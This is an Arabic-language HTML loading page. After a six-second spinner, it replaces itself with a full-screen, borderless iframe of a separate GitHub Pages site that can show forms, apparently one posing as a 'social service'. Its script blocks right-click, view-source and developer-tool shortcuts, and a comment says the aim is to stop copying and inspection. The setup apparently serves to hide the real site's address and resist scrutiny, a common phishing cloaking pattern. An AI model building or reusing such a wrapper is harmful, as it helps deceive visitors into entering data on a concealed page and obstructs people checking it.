<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>جاري التحميل...</title>
  <link rel="icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgL_oR_dIOdypzWyVo5x9C0L4smVVHyWU6iRrajaL9frqGFyBjczvjfx-fe7fuGbxZbmdk7D-0darDYyypSKhzssUun7GT4hPmUfs6AMufR_BX1NGHmS-PvEX95Z77N4UzcjGg4SIDHJn8TuSsjHvzc_RlL1DegAmibk4LApd0uFXD81YG7141oA5_8qz3H/s1080/15536.jpg">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      background: linear-gradient(-45deg, #000428, #004e92, #000428, #004e92);
      background-size: 400% 400%;
      animation: gradientMove 10s ease infinite;
      transition: opacity 1.5s ease-in-out;
    }

    @keyframes gradientMove {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .loader {
      text-align: center;
      position: relative;
      opacity: 1;
      transition: opacity 1s ease;
    }

    .logo {
      width: 160px;
      height: 160px;
      border-radius: 50%;
      background: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgL_oR_dIOdypzWyVo5x9C0L4smVVHyWU6iRrajaL9frqGFyBjczvjfx-fe7fuGbxZbmdk7D-0darDYyypSKhzssUun7GT4hPmUfs6AMufR_BX1NGHmS-PvEX95Z77N4UzcjGg4SIDHJn8TuSsjHvzc_RlL1DegAmibk4LApd0uFXD81YG7141oA5_8qz3H/s1080/15536.jpg") center/cover no-repeat;
      box-shadow: 0 0 30px rgba(0,150,255,0.5);
      animation: pulse 2.5s ease-in-out infinite;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); box-shadow: 0 0 25px rgba(0,150,255,0.4); }
      50% { transform: scale(1.08); box-shadow: 0 0 55px rgba(0,150,255,0.8); }
    }

    .spinner {
      margin-top: 35px;
      width: 65px;
      height: 65px;
      border: 6px solid rgba(255, 255, 255, 0.15);
      border-top-color: #00b3ff;
      border-radius: 50%;
      animation: spin 1.8s cubic-bezier(0.4, 0, 0.2, 1) infinite;
      margin-left: auto;
      margin-right: auto;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    iframe {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      border: none;
      display: none;
      opacity: 0;
      transition: opacity 2s ease;
    }
  </style>
</head>
<body>
  <div class="loader">
    <div class="logo"></div>
    <div class="spinner"></div>
  </div>

  <script>
    const TARGET_URL = "https://social-service-1.github.io/.com/";
    const iframe = document.createElement("iframe");
    iframe.src = TARGET_URL;
    iframe.setAttribute("sandbox", "allow-same-origin allow-forms allow-scripts allow-popups");
    document.body.appendChild(iframe);

    // مدة التحميل 6 ثوانٍ مع انتقال ناعم
    setTimeout(() => {
      document.querySelector(".loader").style.opacity = "0";
      setTimeout(() => {
        document.querySelector(".loader").style.display = "none";
        iframe.style.display = "block";
        setTimeout(() => {
          iframe.style.opacity = "1";
        }, 100);
      }, 1000);
    }, 6000);

    // حماية الكود من النسخ والفحص
    window.addEventListener('contextmenu', e => e.preventDefault());
    window.addEventListener('keydown', e => {
      if ((e.ctrlKey && e.key.toLowerCase()==='u') ||
          (e.ctrlKey && e.shiftKey && (e.key.toLowerCase()==='i' || e.key.toLowerCase()==='c')) ||
          e.key === 'F12') e.preventDefault();
    });
  </script>
</body>
</html>
